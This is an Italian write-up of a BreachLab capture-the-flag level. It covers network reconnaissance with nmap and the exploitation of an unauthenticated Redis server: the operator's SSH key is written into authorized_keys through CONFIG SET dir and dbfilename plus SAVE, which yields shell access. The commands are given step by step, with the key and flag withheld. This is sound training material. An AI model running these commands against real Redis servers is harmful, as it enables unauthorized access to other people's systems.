# Phantom Track - Phantom 17

[← Torna all'indice](../../README.md)

## Sommario

- Track: Phantom Track
- Livello: Phantom 17 ("Internal Hunt")
- Fonte appunti: `phantom_track/phantom17/notes.md`

## Obiettivo

Scansionare la rete interna `10.13.37.0/24`. Uno degli host vicini espone un servizio senza autenticazione che consente di scrivere sul disco locale: l'obiettivo è abusare di quella scrittura per ottenere una shell come l'utente che gestisce il servizio, e recuperare la flag dalla sua home.

## Nota di pubblicazione

Questa versione è pensata per GitHub e segue la dottrina BreachLab: spiega per intero la tecnica di sfruttamento di Redis non autenticato (già documentata pubblicamente, ad esempio su HackTricks), ma omette la chiave SSH pubblica specifica usata dall'operatore e qualunque valore risolutivo finale.

## Ricognizione

Scan iniziale dei tre target indicati nel brief, inizialmente con sintassi errata (nmap tratta gli IP separati da virgola come un unico argomento e fallisce la risoluzione). Ripetendo gli scan singolarmente si mappano i tre host:

```bash
nmap -sV -p 80 10.13.37.30
80/tcp open http BaseHTTPServer 0.6 (Python 3.10.12)
```

Uno degli host (management) espone SSH, HTTP e una finta API "PhantomOracle" — un servizio HTTP scritto in Python che risponde con errori 404/501/400 coerenti ma non espone nulla di direttamente sfruttabile (nessun endpoint utile trovato con i metodi provati).

Uno scan `-p-` completo sugli altri due host rivela la superficie reale:

```bash
nmap -p- 10.13.37.10 10.13.37.20
Nmap scan report for phantom-web... (10.13.37.10)
22/tcp   open  ssh
6379/tcp open  redis

Nmap scan report for phantom-db... (10.13.37.20)
22/tcp open  ssh
```

Uno degli host espone Redis sulla porta standard 6379 — il servizio "senza autenticazione" indicato dal brief.

## Tecnica

Redis, se avviato senza `requirepass` e senza `protected-mode` (o esposto oltre `bind 127.0.0.1`), consente a chiunque raggiunga la porta 6379 di eseguire comandi come `SET`, `CONFIG SET dir`, `CONFIG SET dbfilename` e `SAVE`. Combinando questi comandi è possibile far scrivere a Redis un file arbitrario in una posizione arbitraria del filesystem (nei limiti dei permessi dell'utente che esegue `redis-server`).

La tecnica nota (documentata anche nei link di riferimento del brief, incluso HackTricks) consiste nello scrivere la propria chiave pubblica SSH come valore di una chiave Redis, circondata da newline per "ripulire" il resto del file RDB generato, poi reindirizzare il salvataggio del DB in `~/.ssh/authorized_keys` dell'utente target:

1. `SET <chiave> "\n\n<chiave-pubblica-ssh-dell'operatore>\n\n"` — scrive il contenuto della chiave pubblica come valore in memoria.
2. `CONFIG SET dir /home/<utente>/.ssh` — reindirizza la directory di salvataggio del DB alla home SSH dell'utente target.
3. `CONFIG SET dbfilename authorized_keys` — rinomina il file che Redis scrive.
4. `SAVE` — forza Redis a serializzare il DB su disco, producendo un file `authorized_keys` che, nonostante il rumore binario del formato RDB attorno, resta abbastanza pulito da permettere a OpenSSH di riconoscere la riga della chiave.

Una volta scritta la chiave pubblica dell'operatore in `authorized_keys`, è possibile autenticarsi via SSH con la chiave privata corrispondente come l'utente proprietario del processo Redis.

## Sfruttamento

1. Enumerazione dei servizi con `nmap --script redis-info` per confermare versione e configurazione:

```bash
nmap --script redis-info -sV -p 6379 10.13.37.10
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 6.0.16 (64 bits)
| redis-info:
|   Version: 6.0.16
|   Role: master
|   Bind addresses:
|     0.0.0.0
```

Redis 6.0.16 in ascolto su tutte le interfacce (`0.0.0.0`), senza indicazione di autenticazione richiesta: connessione diretta possibile con un semplice client Redis (`redis-cli -h <host>`).

2. Scrittura della propria chiave pubblica SSH come valore Redis, con newline di padding per isolarla nel file RDB risultante (valore reale della chiave omesso in questa versione pubblica):

```text
SET k "\n\n<PROPRIA_CHIAVE_PUBBLICA_SSH>\n\n"
```

3. Passo successivo necessario per completare l'attacco: reindirizzare la directory e il nome del file di salvataggio verso `~/.ssh/authorized_keys` dell'utente che esegue `redis-server`, poi forzare il salvataggio:

```bash
CONFIG SET dir /home/<utente_redis>/.ssh
CONFIG SET dbfilename authorized_keys
SAVE
```

4. Login SSH con la propria chiave privata come utente proprietario del servizio Redis, seguito dal recupero della flag dalla sua home directory.

## Risultato

Individuata e confermata la superficie vulnerabile (Redis 6.0.16 senza autenticazione, esposto su tutte le interfacce). La tecnica di scrittura della chiave SSH via Redis è spiegata per intero sopra; nessun valore risolutivo (chiave specifica usata, utente finale, flag) viene fornito in questa versione pubblica.

---

## Crediti

Lab: BreachLab. Pubblicare sempre con credito al progetto e senza spoiler risolutivi.
